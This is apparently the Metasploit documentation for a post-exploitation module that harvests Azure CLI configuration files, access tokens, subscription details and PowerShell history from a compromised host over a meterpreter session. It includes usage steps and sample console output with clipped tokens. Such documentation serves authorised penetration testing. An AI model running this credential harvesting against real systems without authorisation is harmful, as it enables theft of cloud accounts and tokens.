## Vulnerable Application

Any windows, linux, or osx system with a `meterpreter` session and

[Azure CLI 2.0+](https://docs.microsoft.com/en-us/cli/azure/?view=azure-cli-latest).

Successfully tested on:

* Azure CLI 2.0.33 on Windows Server 2012 R2, and Windows 10
* azure-cli 2.0.33-1.el7 on openSUSE Tumbleweed 20180517
* Azure CLI 2.61.0 on Windows 10
* Azure CLI 2.35.0 on [Docker](https://github.com/rapid7/metasploit-framework/pull/10113#issuecomment-2191464809)

## Verification Steps

1. Install Azure CLI
2. Start msfconsole
3. Get a `meterpreter` session on some host.
4. Do: `use post/multi/gather/azure_cli_creds`
5. Do: `set SESSION [SESSION_ID]`
6. Do: `run`
7. If the system has readable configuration files for Azure CLI, they will stored in loot and a summary will be printed to the screen.

## Options

## Scenarios

### A new install of 2.0.33 (empty data files) on Windows 10

```
[msf](Jobs:0 Agents:1) post(multi/gather/azure_cli_creds) > run

[*] az cli version: 2.0.33
[*] Looking for az cli data in C:\Users\windows
[*]   Checking for config files
[+]     .Azure/config stored in /root/.msf4/loot/20240616175854_default_111.111.1.11_azure.config.ini_081029.txt
[*]   Checking for context files
[*]   Checking for profile files
[+]     .Azure/azureProfile.json stored in /root/.msf4/loot/20240616175855_default_111.111.1.11_azure.profile.js_357740.txt
[*]   Checking for console history files
[*] Post module execution completed
```

### 2.61.0 on Windows 10

```
msf6 post(multi/gather/azure_cli_creds) > rerun
[*] Reloading module...

[*] az cli version: 2.61.0
[*] Looking for az cli data in C:\Users\kali
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*]   Checking for console history files
[+]     C:\Users\kali/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt stored in /root/.msf4/loot/20240624150413_default_111.111.11.111_azure.console_hi_878016.txt
[*]   Checking for powershell transcript files
[*] Looking for az cli data in C:\Users\h00die
[*]   Checking for config files
[+]     .Azure\config stored in /root/.msf4/loot/20240624150413_default_111.111.11.111_azure.config.ini_539242.txt
[*]   Checking for context files
[+]     .Azure/AzureRmContext.json stored in /root/.msf4/loot/20240624150414_default_111.111.11.111_azure.context.js_041230.txt
[*]   Checking for profile files
[+]     .Azure/azureProfile.json stored in /root/.msf4/loot/20240624150414_default_111.111.11.111_azure.profile.js_538496.txt
[*]   Checking for console history files
[+]     C:\Users\h00die/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt stored in /root/.msf4/loot/20240624150414_default_111.111.11.111_azure.console_hi_210490.txt
[*]   Checking for powershell transcript files
[+]     C:\Users\h00die/Documents/PowerShell_transcript.EDLT.Dz6sxz6B.20150720151906.txt stored in /root/.msf4/loot/20240624150415_default_111.111.11.111_azure.transcript_021248.txt
[+]     C:\Users\h00die/Documents/PowerShell_transcript.EDLT.Dz6sxz6B.20230720151906.txt stored in /root/.msf4/loot/20240624150415_default_111.111.11.111_azure.transcript_743088.txt
[+] Line 1 may contain sensitive information. Manual search recommended, keyword hit: New-PSSession
[+] Subscriptions
=============

 Account Name               Username                              Cloud Name
 ------------               --------                              ----------
 EXAMPLE11111               1111111111111-1111-1111-111111111111  AzureCloud
 N/A(tenant level account)  james@example12.onmicrosoft.com       AzureCloud

[+] Context
=======

 Username                           Account Type      Access Token                           Graph Access Token                       MS Graph Access Token  Key Vault Token                       Principal Secret
 --------                           ------------      ------------                           ------------------                       ---------------------  ---------------                       ----------------
 1111111111111-1111-1111-111111111  AccessToken       eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsI  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng                         eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs
 111                                                  ng1dCI6IkwxS2ZLRklfam5YYndXYzIyeFp4dz  1dCI6IkwxS2ZLRklfam5YYndXYzIyeFp4dzFzVU                         Ing1dCI6IkwxS2ZLRklfam5YYndXYzIyeFp4
                                                      (clip)                                 (clip)                                                          (clip)
 HelpDeskAdmin@example123456.onmic  User
 rosoft.com
 1111111111111-1111-1111-111111111  ServicePrincipal
 a1c
 1111111111111-1111-1111-111111111  AccessToken       eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsI                                                                  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs
 f40                                                  ng1dCI6IkwxS2ZLRklfam5YYndXYzIyeFp4dz                                                                  Ing1dCI6IkwxS2ZLRklfam5YYndXYzIyeFp4
                                                      (clip)                                                                                                 (clip)
 storageviewer@example12.onmicros  User
 oft.com

[*] Post module execution completed
msf6 post(multi/gather/azure_cli_creds) > 
```

### 2.35.0 on Docker

```
msf6 post(multi/gather/azure_cli_creds) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api, stdapi_railgun_api_multi, stdapi_railgun_memread, stdapi_railgun_memwrite, stdapi_registry_check_key_exists, stdapi_registry_create_key, stdapi_registry_delete_key, stdapi_registry_enum_key_direct, stdapi_registry_enum_value_direct, stdapi_registry_load_key, stdapi_registry_open_key, stdapi_registry_query_value_direct, stdapi_registry_set_value_direct, stdapi_registry_unload_key, stdapi_sys_config_getprivs
[*] Unable to determine az cli version
[*] Looking for az cli data in /bin
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /dev
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /home/user
[*]   Checking for config files
[+]     .azure/config stored in /home/mtcyr/.msf4/loot/20240627140350_default_172.17.0.2_azure.config.ini_433702.txt
[*]   Checking for context files
[*]   Checking for profile files
[+]     .azure/azureProfile.json stored in /home/mtcyr/.msf4/loot/20240627140350_default_172.17.0.2_azure.profile.js_201042.txt
[*] Looking for az cli data in /nonexistent
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /root
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /usr/games
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /usr/sbin
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/backups
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/cache/man
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/lib/gnats
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/list
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/mail
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/run/ircd
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/spool/lpd
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/spool/news
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/spool/uucp
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[*] Looking for az cli data in /var/www
[*]   Checking for config files
[*]   Checking for context files
[*]   Checking for profile files
[+] Subscriptions
=============

 Account Name               Username                                          Cloud Name
 ------------               --------                                          ----------
 N/A(tenant level account)  example123@example12345678901234.onmicrosoft.com  AzureCloud

[*] Post module execution completed
```
